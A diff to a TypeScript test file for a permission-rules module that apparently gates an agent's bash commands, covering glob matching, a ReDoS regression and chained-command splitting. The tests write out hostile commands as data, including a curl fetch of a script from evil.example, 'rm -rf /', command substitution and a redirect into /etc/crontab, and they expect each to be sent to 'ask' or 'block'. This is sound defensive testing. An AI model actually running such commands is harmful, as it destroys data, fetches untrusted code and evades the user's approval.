@@ -2,7 +2,7 @@ import { describe, expect, test } from "bun:test";
 import { unlinkSync, writeFileSync } from "node:fs";
 import {
   decide,
-  globToRegExp,
+  globMatches,
   loadRules,
   matches,
   type PermissionRules,
@@ -32,7 +32,7 @@ describe("parseRules", () => {
   });
 });
 
-describe("globToRegExp / matches", () => {
+describe("globMatches / matches", () => {
   test("* spans any characters including slashes", () => {
     expect(matches(["/a/*/z"], "/a/b/c/z")).toBe(true);
   });
@@ -41,7 +41,7 @@ describe("globToRegExp / matches", () => {
     expect(matches(["git status"], "git status ")).toBe(false);
     expect(matches(["git status"], "git  status")).toBe(false);
   });
-  test("regex metacharacters are escaped", () => {
+  test("regex metacharacters stay literal", () => {
     expect(matches(["a.b"], "axb")).toBe(false);
     expect(matches(["a.b"], "a.b")).toBe(true);
     expect(matches(["a+b"], "a+b")).toBe(true);
@@ -55,8 +55,67 @@ describe("globToRegExp / matches", () => {
     expect(matches([""], "")).toBe(true);
     expect(matches([""], "x")).toBe(false);
   });
-  test("escapeRegex escapes the glob star", () => {
-    expect(globToRegExp("a*").source).toBe("^a.*$");
+  test("multi-star patterns anchor like ^a.*b.*c$", () => {
+    expect(globMatches("a*b*c", "aXbYc")).toBe(true);
+    expect(globMatches("a*b*c", "abc")).toBe(true);
+    expect(globMatches("a*b*c", "aXcYb")).toBe(false);
+    expect(globMatches("*b", "aXb")).toBe(true);
+    expect(globMatches("*b", "aXbY")).toBe(false);
+    expect(globMatches("a*", "Xa")).toBe(false);
+  });
+  test("pathological multi-star input terminates fast (ReDoS regression)", () => {
+    const pattern = `${"*a".repeat(200)}!`;
+    expect(globMatches(pattern, "a".repeat(400))).toBe(false);
+  });
+});
+
+describe("decide: bash composition (every segment must be allowed)", () => {
+  const rules: PermissionRules = { bash: { allowPatterns: ["make *", "npm run *"] } };
+
+  test("plain prefix allow still allows", () => {
+    expect(decide(rules, "bash", "make build")).toBe("allow");
+  });
+  test("chained commands where every segment matches an allow stay allowed", () => {
+    // The e2e background journey shape: echo + sleep + echo under two prefixes.
+    const echoSleep: PermissionRules = { bash: { allowPatterns: ["echo *", "sleep *"] } };
+    expect(decide(echoSleep, "bash", "echo bg-wake-A1 && sleep 12 && echo bg-wake-A2")).toBe(
+      "allow",
+    );
+    expect(decide(rules, "bash", "make build && make test")).toBe("allow");
+  });
+  test("a chain with one unallowed segment downgrades to ask", () => {
+    expect(decide(rules, "bash", "make build; curl http://evil.example/x.sh")).toBe("ask");
+    expect(decide(rules, "bash", "make test && rm -rf /")).toBe("ask");
+    expect(decide(rules, "bash", "npm run build | tee log")).toBe("ask");
+    expect(decide(rules, "bash", "make build && make test; curl x")).toBe("ask");
+  });
+  test("substitution and redirection never compose", () => {
+    expect(decide(rules, "bash", "make `whoami`")).toBe("ask");
+    expect(decide(rules, "bash", "npm run $(steal)")).toBe("ask");
+    expect(decide(rules, "bash", "make build > /etc/crontab")).toBe("ask");
+    expect(decide(rules, "bash", "make build < seed.txt")).toBe("ask");
+  });
+  test("background & and newlines split segments too", () => {
+    expect(decide(rules, "bash", "make build & curl x")).toBe("ask");
+    expect(decide(rules, "bash", "make build\nmake test")).toBe("allow");
+    expect(decide(rules, "bash", "make build\ncurl x")).toBe("ask");
+  });
+  test("empty segments after a trailing separator do not break the allow", () => {
+    expect(decide(rules, "bash", "make build;")).toBe("allow");
+  });
+  test("allow-all still grants composition (explicit opt-in)", () => {
+    expect(decide({ ...rules, mode: "allow-all" }, "bash", "a; b")).toBe("allow");
+  });
+  test("block still beats the composition downgrade", () => {
+    const both: PermissionRules = {
+      bash: { allowPatterns: ["make *"], blockPatterns: ["*curl*"] },
+    };
+    expect(decide(both, "bash", "make build; curl x")).toBe("block");
+  });
+  test("composition gating is bash-only (write/edit paths untouched)", () => {
+    expect(decide({ write: { allowPatterns: ["/proj/*"] } }, "write", "/proj/a && b")).toBe(
+      "allow",
+    );
   });
 });
 
